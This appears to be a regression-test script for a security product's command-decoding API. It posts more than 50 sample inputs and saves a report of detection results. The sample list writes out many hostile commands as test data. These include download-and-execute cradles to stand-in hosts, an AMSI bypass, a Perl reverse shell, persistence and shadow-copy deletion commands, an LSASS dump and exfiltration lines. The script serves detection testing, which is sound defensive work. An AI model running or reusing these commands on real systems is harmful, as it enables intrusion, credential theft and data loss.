"""NivXRay · Extensive Decode Regression — Feb 2026

Feeds 50+ payloads (encoded, plaintext, multi-layer nested) through the
real /api/decode/smart endpoint and produces a Markdown report.
"""
import json
import os
import base64
import gzip
import time
from typing import Dict, Any, List

import requests

API = os.popen('grep REACT_APP_BACKEND_URL /app/frontend/.env | cut -d= -f2').read().strip()
# Credentials come from env (backend/.env exports ADMIN_EMAIL / ADMIN_PASSWORD).
_EMAIL = os.environ.get("ADMIN_EMAIL", "admin@nivxray.com")
_PASSWORD = os.environ.get("ADMIN_PASSWORD", "")
if not _PASSWORD:
    raise SystemExit("ADMIN_PASSWORD env var required (source backend/.env first)")
TOK = os.popen(
    f"""curl -s -X POST {API}/api/auth/login -H 'Content-Type: application/json' """
    f"""-d '{{"email":"{_EMAIL}","password":"{_PASSWORD}"}}' """
    """| python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" """
).read().strip()
H = {"Authorization": f"Bearer {TOK}"}


def b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-16-le")).decode()

def b64a(s: str) -> str:
    return base64.b64encode(s.encode()).decode()

def gz_b64(s: str) -> str:
    return base64.b64encode(gzip.compress(s.encode())).decode()

def hex_of(s: str) -> str:
    return s.encode().hex()

# Precomputed b64 payloads (backslashes disallowed in f-string expressions on py<3.12)
_A2_INNER = 'IEX(New-Object Net.WebClient).DownloadString("http://10.0.0.1/x.ps1")'
_A3_INNER = '$w=New-Object Net.WebClient; $w.DownloadFile("http://evil/y.exe","$env:TEMP\\y.exe"); Start-Process "$env:TEMP\\y.exe"'
_B1_INNER = "S`eT-It`em ( 'V'+'aR' + 'IA' + ((\"{1}{0}\"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; curl.exe https://10.2.27.30"
_D7_INNER = 'import os;os.system("id")'
_A2_B64 = b64(_A2_INNER)
_A3_B64 = b64(_A3_INNER)
_B1_B64 = b64(_B1_INNER)
_D7_B64 = b64a(_D7_INNER)

# ═════════ 50+ payloads · balanced mix ═════════
CASES: List[Dict[str, Any]] = [
    # ── Group A: Classic single-layer encoded (5) ──
    {"label":"A1 · PS -EncodedCommand short",     "input": f"powershell -EncodedCommand {b64('Write-Host hello')}"},
    {"label":"A2 · PS -EncodedCommand long",      "input": f"powershell -NoP -W Hidden -EncodedCommand {_A2_B64}"},
    {"label":"A3 · PS -Enc UTF16-LE + IEX",       "input": f"powershell -e {_A3_B64}"},
    {"label":"A4 · PS AMSI reflection short",     "input": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"},
    {"label":"A5 · CMD /c chain",                 "input": "cmd.exe /c \"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://x/y.ps1')\""},

    # ── Group B: Multi-layer nested (>5 layers) (8) ──
    {"label":"B1 · b64 → utf16le → PS concat AMSI",  "input": f"powershell -Enc {_B1_B64}"},
    {"label":"B2 · b64 → gzip → shell curl",         "input": f"echo '{gz_b64('curl -fsSL http://x.io/x.sh | bash')}' | base64 -d | gunzip | bash"},
    {"label":"B3 · b64 → hex → xor",                 "input": f"$s=[Convert]::FromBase64String('{b64a('E5A6B79FA8C0DEF0'*10)}'); for($i=0;$i-lt$s.Length;$i++){{$s[$i]=$s[$i]-bxor 0x2A}}"},
    {"label":"B4 · CS byte-array shellcode loader",  "input": f"[Byte[]]$var_code = [System.Convert]::FromBase64String('{b64a('A' * 250)}'); [Byte[]]$var_key = [System.Convert]::FromBase64String('AAAA')"},
    {"label":"B5 · MSFvenom cld;call",               "input": f"$c={b64a(chr(0xFC)+chr(0xE8)+chr(0x82)+chr(0)+'A'*50)}; VirtualAlloc(0,$c.Length,0x3000,0x40); [System.Runtime.InteropServices.Marshal]::Copy($c,0,$p,$c.Length); CreateThread(0,0,$p,0,0,0)"},
    {"label":"B6 · Nested b64 (double-wrap)",        "input": f"powershell -Enc {b64('powershell -Enc ' + b64('Write-Host inner'))}"},
    {"label":"B7 · Bash flock + wget + b64",         "input": f"( flock -x 200; wget -qO- http://x.io/{b64a('id;whoami')} | base64 -d | bash ) 200>/tmp/l.lock"},
    {"label":"B8 · CMD → PS → IEX → download → exec","input": "cmd /c powershell -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://a/b.ps1')); Start-Process $env:TEMP\\dropper.exe\""},

    # ── Group C: Fragment-mode (no host binary) (8) ──
    {"label":"C1 · Fragment -EncodedCommand",     "input": f"-EncodedCommand {b64('Get-Process')}"},
    {"label":"C2 · Fragment /c chain",            "input": "/Q /c \"for /f %A in ('tasklist') do rundll32.exe C:\\Windows\\System32\\comsvcs.dll, #+000024 %A\""},
    {"label":"C3 · Fragment -urlcache",           "input": "-urlcache -split -f http://evil/x.exe C:\\Users\\Public\\x.exe"},
    {"label":"C4 · Fragment /transfer bitsadmin", "input": "/transfer job http://evil/loader.exe C:\\Windows\\Temp\\l.exe"},
    {"label":"C5 · Fragment schtasks",            "input": "/create /tn Updater /tr \"C:\\Users\\Public\\p.exe\" /sc onlogon /rl highest"},
    {"label":"C6 · Fragment reg persistence",     "input": "add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Upd /d \"C:\\p.exe\" /f"},
    {"label":"C7 · Fragment vssadmin",            "input": "delete shadows /all /quiet"},
    {"label":"C8 · Fragment comsvcs ordinal",     "input": "C:\\Windows\\System32\\comsvcs.dll, #+000024 1076 \\Windows\\Temp\\m.dmp full"},

    # ── Group D: Cross-platform (8) ──
    {"label":"D1 · Linux curl | bash",            "input": "curl -fsSL http://x/y.sh | bash"},
    {"label":"D2 · Linux wget | sh",              "input": "wget -qO- http://x/y.sh | sh"},
    {"label":"D3 · Linux nohup bg",               "input": "nohup /tmp/x >/dev/null 2>&1 &"},
    {"label":"D4 · Linux crontab persistence",    "input": "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/x.sh') | crontab -"},
    {"label":"D5 · macOS osascript",              "input": "osascript -e 'do shell script \"curl http://x/y.sh | bash\"'"},
    {"label":"D6 · macOS LaunchAgent plist",      "input": "launchctl load ~/Library/LaunchAgents/com.evil.updater.plist"},
    {"label":"D7 · Python b64 exec",              "input": f"python -c \"import base64;exec(base64.b64decode('{_D7_B64}'))\""},
    {"label":"D8 · Perl reverse shell",           "input": "perl -e 'use Socket;$i=\"1.2.3.4\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");exec(\"/bin/sh -i\");};'"},

    # ── Group E: LOLBAS / Living-off-the-land (8) ──
    {"label":"E1 · certutil download",            "input": "certutil.exe -urlcache -split -f https://evil/x.exe %TEMP%\\x.exe"},
    {"label":"E2 · mshta remote HTA",             "input": "mshta.exe javascript:eval(new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\"))"},
    {"label":"E3 · rundll32 JS",                  "input": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\x3Cscript src=http://x/x.js\\x3E\\x3C/script\\x3E\")"},
    {"label":"E4 · regsvr32 SCT",                 "input": "regsvr32.exe /s /n /u /i:http://evil/xxx.sct scrobj.dll"},
    {"label":"E5 · installutil AllUser",          "input": "InstallUtil.exe /logfile= /LogToConsole=false /U C:\\payload.dll"},
    {"label":"E6 · Msbuild inline task",          "input": "msbuild.exe C:\\Users\\Public\\evil.csproj"},
    {"label":"E7 · Bitsadmin transfer",           "input": "bitsadmin /transfer myJob /download /priority normal http://evil/x.exe C:\\x.exe"},
    {"label":"E8 · Wmic remote spawn",            "input": "wmic /node:\"192.168.1.10\" process call create \"powershell -c IEX\""},

    # ── Group F: Impact / Lateral / Exfil (5) ──
    {"label":"F1 · Impact · Ransomware precursor","input": "vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet & wevtutil cl Security & bcdedit /set {default} bootstatuspolicy ignoreallfailures"},
    {"label":"F2 · Lateral · PsExec + SMB share", "input": "psexec.exe \\\\FILESRV -s -h cmd.exe /c \"Copy-Item -Path C:\\evil.exe -Destination \\\\FILESRV\\C$\\Windows\\Temp\\\""},
    {"label":"F3 · Exfil · POST via IWR",         "input": "Invoke-WebRequest -Uri http://exfil.example/upload -Method POST -InFile C:\\Users\\Public\\loot.zip -Headers @{Cookie='sid=abc'}"},
    {"label":"F4 · Exfil · aws s3 cp",            "input": "aws s3 cp secrets.tar.gz s3://attacker-bucket/loot/ --acl public-read"},
    {"label":"F5 · Collection · archive + IWR",   "input": "Compress-Archive -Path C:\\Users\\*\\Documents -DestinationPath $env:TEMP\\loot.zip; iwr -Uri http://x/u -Method POST -InFile $env:TEMP\\loot.zip"},

    # ── Group G: Cloud tokens / novel tradecraft (4) ──
    {"label":"G1 · JWT with google svc-account",  "input": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImFiYzEyMyJ9.eyJpc3MiOiJzdmMtYWNjb3VudEBteS1wcm9qZWN0LmlhbS5nc2VydmljZWFjY291bnQuY29tIiwic2NvcGUiOiJodHRwczovL3d3dy5nb29nbGVhcGlzLmNvbS9hdXRoL2Nsb3VkLXBsYXRmb3JtIn0.SIG"},
    {"label":"G2 · JWT Cognito abuse",            "input": "eyJraWQiOiJmZDU3OTAyOSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiJhYmMtMTIzIiwiY29nbml0bzp1c2VybmFtZSI6InZpY3RpbUB0YXJnZXQuY29tIn0.SIG"},
    {"label":"G3 · Ngrok tunnel C2",              "input": "ssh -R 22:localhost:22 tunnel@1.tcp.ngrok.io -p 12345 -N"},
    {"label":"G4 · ClickFix RunMenu paste",       "input": "powershell -w h -c \"iwr http://legit.blob.core.windows.net/tools/updater.ps1 -UseBasicParsing | iex\""},

    # ── Group H: Benign / negative controls (4) — should NOT fire ──
    {"label":"H1 · Benign hostname",              "input": "WIN10-DEV-42"},
    {"label":"H2 · Benign echo",                  "input": "echo Hello World"},
    {"label":"H3 · Benign var assignment",        "input": "$x = 'production'"},
    {"label":"H4 · JSON debris",                  "input": "],"},
]

print(f"Total cases: {len(CASES)}")
results = []
t0 = time.time()

for i, c in enumerate(CASES, 1):
    try:
        r = requests.post(f"{API}/api/decode/smart", headers=H,
                          json={"input": c["input"]}, timeout=30)
        d = r.json() if r.status_code == 200 else {"error": r.text[:200]}
        mitre = d.get("mitre") or []
        lolbas = d.get("lolbas") or []
        iocs = d.get("iocs") or {}
        risk = d.get("risk") or {}
        chain = d.get("chain_ids") or d.get("chain") or []
        out = d.get("output") or ""
        results.append({
            "n": i,
            "label": c["label"],
            "input_snippet": c["input"][:80],
            "status": r.status_code,
            "engine": d.get("engine", "?"),
            "score":  d.get("score"),
            "verdict": risk.get("verdict"),
            "level":   risk.get("level"),
            "reached_shellcode": d.get("reached_shellcode"),
            "chain": chain if isinstance(chain, list) else [chain],
            "mitre_count":  len(mitre),
            "mitre_ids":    [m.get("id") for m in mitre],
            "lolbins":      [l.get("binary") for l in lolbas],
            "iocs_urls":    iocs.get("urls", []),
            "iocs_ips":     iocs.get("ips", []),
            "output_len":   len(out),
            "output_head":  out[:180],
        })
    except Exception as e:
        results.append({"n": i, "label": c["label"], "error": str(e)[:200]})

elapsed = time.time() - t0
os.makedirs("/app/frontend/public/downloads", exist_ok=True)
with open("/app/frontend/public/downloads/nivxray_extensive_regression.json", "w") as f:
    json.dump({"total": len(results), "elapsed_sec": round(elapsed, 2),
               "results": results}, f, indent=2, default=str)

# Console summary
malicious = sum(1 for r in results if (r.get("level") or "").lower() in ("high","critical","malicious"))
suspicious = sum(1 for r in results if (r.get("level") or "").lower() in ("medium","suspicious"))
zero_mitre = sum(1 for r in results if r.get("mitre_count", 0) == 0 and "H" not in r.get("label",""))
shellcode = sum(1 for r in results if r.get("reached_shellcode"))
print(f"\nRuntime         : {elapsed:.1f}s ({elapsed/len(results):.2f}s per case)")
print(f"Malicious       : {malicious}")
print(f"Suspicious      : {suspicious}")
print(f"Shellcode-reach : {shellcode}")
print(f"Zero-MITRE (non-benign) : {zero_mitre}")
print(f"\nSaved: /app/frontend/public/downloads/nivxray_extensive_regression.json")
